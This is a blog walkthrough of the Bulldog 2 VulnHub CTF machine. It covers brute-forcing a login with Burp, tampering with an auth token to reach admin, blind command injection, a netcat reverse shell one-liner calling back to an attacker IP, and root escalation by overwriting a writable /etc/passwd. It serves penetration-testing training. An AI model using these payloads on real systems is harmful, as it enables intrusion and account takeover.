<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Bulldog:2 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-bulldog2-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-08-05T15:42:36+00:00">August 5, 2018</time><time class="updated" datetime="2025-06-10T20:29:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Bulldog 2”. This VM is developed by Nick Frichette, which is a standard Boot-to-Root challenge. Our goal is to get into the root directory and see the congratulatory message.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> To Find The Final Flag.</span></p>
<p><span style="color: #000000;"><strong>Steps involved:</strong></span></p>
<ol>
<li><span style="color: #000000;">Post-scanning to discover open ports</span></li>
<li><span style="color: #000000;">Discovery of top monthly users</span></li>
<li><span style="color: #000000;">Discovery of authorization of admin in a JavaScript file</span></li>
<li><span style="color: #000000;">Bruteforcing each user with fasttrack.txt</span></li>
<li><span style="color: #000000;">Modification of response code of correct credential to make it master_admin_user</span></li>
<li><span style="color: #000000;">Discovery of the new admin dashboard</span></li>
<li><span style="color: #000000;">Exploiting CLI in password tab in the Login page</span></li>
<li><span style="color: #000000;">Getting netcat shell</span></li>
<li><span style="color: #000000;">Spawning a teletype</span></li>
<li><span style="color: #000000;">Escalating privileges using writable /etc/passwd file</span></li>
</ol>
<p><span style="color: #000000;"><strong>Let’s Breach!!</strong></span></p>
<p><span style="color: #000000;">The target holds 192.168.1.120 as network IP; now using nmap lets find out open ports.</span></p>
<pre class="lang:default decode:true">nmap –A 192.168.1.120</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-r92T783BwIo/W2cOOTXtFRI/AAAAAAAAZO0/pKPV5JIrk8IuXc9_YxYMP1T-ekb5PPaIACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Nmap scan shows us port 80 is open, so we open the IP address in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qnqnI7zUcmk/W2cORxlZ5wI/AAAAAAAAZRA/zX9ivvlSF5oxn9JwqfhW2G24kDOiJDIZQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We saw a <strong>Register</strong> <strong>tab</strong> on the Homepage. After Clicking on it, <strong>a notice was given on that page stating that they are not accepting registration at this time due to security concerns. </strong>This means we can’t register as a new user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-79jA41ELkUE/W2cOVuyLI8I/AAAAAAAAZQ8/ZhWac0LdgQI5PbyV3imXI7XOLpxUB185ACEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">There was a Login tab as well on the Homepage, which led us to think if we can’t register as a new user then let’s login as an existing user. It came into our notice that there was a <strong>User’s</strong> Tab given on the Homepage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-I4BfsDy51uE/W2cOV-g95oI/AAAAAAAAZQw/mKsknS1HjQMaksLx9pEjQ9a2lMv3iJALwCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">After exploring the details inside the <strong>Users Tab, </strong>we came to know about all the usernames of the Top Monthly Users. This can be used as a clue later on.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-NpR-XFCbeEU/W2cOWUBqjsI/AAAAAAAAZRA/wiXxRaHjWeMSjHfcj6X2YpLMf1BsYE2cgCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Next, we thought of Viewing the Page Source of the Webpage, where we found a file <strong>main.8b490782e52b9899e2a7.bundle.js</strong> .</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-esMSIheSav4/W2cOWSKKyCI/AAAAAAAAZQ0/GDh14rhV1_4trV2Kiv4dVKcMXOfJOy5oQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">After viewing the contents of this file, we found out that <strong>master_admin_user</strong> has the highest <strong>auth_level</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-IH10uB0Z_VQ/W2cOW99j32I/AAAAAAAAZQ4/sRUsSoXPYgsF0gNRYfr2dvunoSCS_lWwQCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We thought of capturing the request of the <strong>Login</strong> <strong>Page</strong> in <strong>Burp</strong> <strong>Suite</strong>. Send the captured request to the intruder. Select <strong>attack type</strong> as <strong>Cluster Bomb </strong>to perform brute forcing over Username and Password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2AJHaqEgcHk/W2cOXX0fPeI/AAAAAAAAZQ8/7GKjViIdBHc0By18MssWIE0HdyWp2A4kgCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now we have selected the <strong>Payload</strong> <strong>type</strong> as <strong>Simple</strong> <strong>list</strong> for <strong>Payload</strong> <strong>set</strong> <strong>1</strong> where we have given the list all the <strong>usernames</strong> of the <strong>Top</strong> <strong>Monthly</strong> <strong>Users </strong>found earlier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-1IadGGKlnkw/W2cOXtP6HNI/AAAAAAAAZRA/OAgfefJhC0AuXMN_FI7yuecLsaHZ3UAAACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Similarly for <strong>Payload</strong> <strong>set</strong> <strong>2</strong> we have given <strong>Payload</strong> <strong>type</strong> as <strong>Simple</strong> <strong>list</strong>, here we have loaded the dictionary file of fasttrack.txt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-d8OD6xk8o_Y/W2cOOt09MEI/AAAAAAAAZQ8/MmfXiQc5nBE5oSPmsoY-wguFoMvYOhP4gCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Once Brute Forcing is completed, we have got the <strong>password</strong> <strong>qwerty</strong> for the <strong>username</strong> <strong>mdrudie</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-k4LWXo16RW4/W2cOOuxL8yI/AAAAAAAAZRA/l8FpTAeWx4McTYLcr2MB5UfHrXInqmpHgCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now logging in with username mdrudie and password qwerty. As you can see these details have successfully logged us in.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-vsF_CStk1yU/W2cOPn1COxI/AAAAAAAAZQ4/xUAuxrcEgtg9aVXmTAep_zARHs96aLgJwCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now capturing the request of the Login page, we will also intercept the response of the captured request.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ACs1f60sMW0/W2cOP8i_b7I/AAAAAAAAZQ8/vUK8H6FU8FAQnlp1DtPrY-Ln1BrxbpGEACEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We have copied this response and decoded it using an online JSON Token converter. Here we see the auth_level is at standard_user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kkr3mxnNPVg/W2cOPg7M_bI/AAAAAAAAZRA/H8z7ZX2FWMgzDwu6da4o9kdu8Ag4RizSQCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Changing the auth_level to master_admin_user. This will give us the admin privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-x1gpIN7tzhM/W2cOQWE8NdI/AAAAAAAAZQ0/ey5u_waF7Ao3jD-S6q6ECUEFdFptPT9AgCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now copy the <strong>edited</strong> <strong>encoded</strong> <strong>response</strong> and <strong>Replace</strong> it with the <strong>old</strong> <strong>encoded</strong> <strong>response</strong> in the <strong>Burp</strong> <strong>Suite</strong>. Also, change the <strong>auth_level</strong> to <strong>master_admin_level</strong> as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RUBVt_zmgrM/W2cOQYbIRuI/AAAAAAAAZQs/4PNkvUFAGT86kAk3FFdSrhTyyYKzUTLuwCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">On forwarding the request, we have successfully logged in the user with admin privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CwG-0d9sWAI/W2cOQtgWuNI/AAAAAAAAZQo/7JuwshnNaB8dasPNjRbvoCO8KiVQqgycACEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now clicking on the <strong>Admin tab, </strong>an<strong> Admin Dashboard login form</strong> opens up which asks for a username and password. The line about using a CLI tool to log in gave us a hint about command injection.  Unfortunately, it’s a blind command injection. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mB7lNMOiKWw/W2cORZ89HOI/AAAAAAAAZQo/dTuBi5SUn7oKyKG-alseGSBT8jYfuKnZwCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Now we will dump the ICMP packets that are destined towards eth0 interface. By using the command:</span></p>
<pre class="lang:default decode:true">tcpdump -nni eth0 icmp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9W4hcF5TFGw/W2cORQvvywI/AAAAAAAAZQo/iTAix0Lm_O8_rF-MUp8YSzurzRSdUdDNwCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now by capturing the request of the <strong>Login</strong> <strong>Form</strong> of the <strong>Admin Dashboard</strong> using <strong>username</strong> <strong>mdrudie</strong> and <strong>password</strong> <strong>qwerty </strong>through burp suite. Now we will check if the <strong>command injection</strong> is working in the <strong>password input area</strong> by using the command:</span></p>
<pre class="lang:default decode:true">; ping 192.168.1.104 -c 4</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MvVSl71pN0Q/W2cOSUjRckI/AAAAAAAAZQo/2mRnc2Q29AEezj1z2ZLOJNY0R2zx9Y-DACEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Since we are able to capture the <strong>ICMP</strong> <strong>packets</strong> at eth0 interface, this means command injection is working in the password input area.</span></p>
<pre class="lang:default decode:true">tcpdump -nni eth0 icmp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B7JVoytFKog/W2cOSjOMyTI/AAAAAAAAZQ4/e3u1DG2RTqIE8DaHobItnykRmdeNqZgYQCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Now using the <strong>reverse shell one-liner</strong> in the password input area which is given below: form pentestmonkey</span></p>
<pre class="lang:default decode:true ">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.104 1234 &gt;/tmp/f</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T4XsfJGHQ4Y/W2cOS-FCwJI/AAAAAAAAZQo/JZ-cgtLI4G0KjhGd2MMNW01MGeR5VxczACEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Side by Side we have activated a netcat listener and obtained a shell.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-A1vIGdaYDH4/W2cOTbLrxNI/AAAAAAAAZQ4/_XO-fsFu2n4DubYREnjUfxhGSKp4br-PQCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">We will be checking permissions for /etc/passwd directory using the command:</span></p>
<pre class="lang:default decode:true">ls -al /etc/passwd</pre>
<p><span style="color: #000000;">As you can see this directory is having permission to read, write and execute.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-k5zR7B-pigY/W2cOTn6reOI/AAAAAAAAZQs/iJShGwB3nMAUCUqui1FW31d14SQriXoTwCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We read the /etc/passwd file using cat utility after that.</span></p>
<pre class="lang:default decode:true  ">cat /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wmjMV7za8Pg/W2cOT7HOUHI/AAAAAAAAZQs/9ItJ0cpkkqsExDR1Yfu62fUhVVtAWU8qQCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Our aim was to add a user in /etc/passwd file as root. So, we use OpenSSL utility to create a password hash with the command:</span></p>
<pre class="lang:default decode:true">openssl passwd –l –salt user3 pass123</pre>
<p><span style="color: #000000;">Copy the password hash in someplace safe now.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-FDB3bdAOL_8/W2cOUZMzTWI/AAAAAAAAZQw/JlYfg-7BTUI1MzdiN2TyVHu0h53dhUugwCEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Copy the /etc/passwd file in a leafpad file and let’s add our custom user in there.</span></p>
<pre class="lang:default decode:true">hack:$1$user3$&lt;hash&gt;/:0:0:/hack:/bin/bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Ge7oW20UmQo/W2cOUmY-TaI/AAAAAAAAZQs/w49momM5Ac4r3e8V4PrK9eRfPKwxppv8wCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Save this file somewhere on the desktop and download this file on server’s /tmp (universal writeable) directory.</span></p>
<p><span style="color: #000000;">Then use cp to copy and replace this file with the original file with the command:</span></p>
<pre class="lang:default decode:true">cp passwd /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-145HSfCRBLM/W2cOUx17QnI/AAAAAAAAZQ0/As3zO9ZxZiUt_EZr3QpBJHyv42kOwG-eACEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Let’s try and login using su binary:</span></p>
<pre class="lang:default decode:true">su hack
[password]: pass123</pre>
<p><span style="color: #000000;">Oh yeah, we got the root shell! Let’s read the flag now.</span></p>
<pre class="lang:default decode:true">cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QXV3J--2gA4/W2cOVYmHumI/AAAAAAAAZRA/hNX3iXhPabAR94msCRc4WZg3E_ywyWzsgCEwYBhgL/s1600/29.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Security Researcher and Technical at Hacking Articles. See’s things from a different angle and an out of the box thinker. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
